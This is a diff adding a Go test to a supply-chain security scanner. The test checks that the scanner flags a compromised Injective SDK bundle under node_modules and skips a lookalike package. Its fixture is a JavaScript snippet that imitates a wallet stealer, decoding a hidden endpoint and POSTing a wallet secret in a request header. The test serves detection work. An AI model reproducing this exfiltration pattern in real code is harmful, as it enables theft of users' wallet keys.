@@ -327,6 +327,60 @@ func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_InjectiveWalletStealerUnderNodeModules proves the bounded
+// node_modules exception reaches the compromised generated bundle without
+// broad-scanning unrelated package files.
+func TestScan_InjectiveWalletStealerUnderNodeModules(t *testing.T) {
+	raw := []byte(`
+const endpoint = chars.map((x) => String.fromCharCode(x)).join("");
+function trackKeyDerivation(method, value) { queue.push(method + ":" + value); }
+fetch(endpoint, {method: "POST", headers: {
+  "Content-Type": "application/grpc-web+proto",
+  "X-Request-Id": encodedWalletSecret
+}});
+`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "@injectivelabs", "sdk-ts", "dist", "esm", "accounts-jQ1GSgaW.js")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "@injectivelabs+sdk-ts@1.20.21", "node_modules", "@injectivelabs", "sdk-ts", "dist", "cjs", "accounts-Cy0p4lLW.cjs")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+			lookalike := filepath.Join(root, "node_modules", "@other", "sdk-ts", "dist", "esm", "accounts-lookalike.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "injective-sdk-wallet-secret-exfil-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("injective wallet-stealer findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_TimeoutHonored asserts that ScanTimeout terminates a slow scan
 // gracefully and still returns the partial result.
 func TestScan_TimeoutHonored(t *testing.T) {
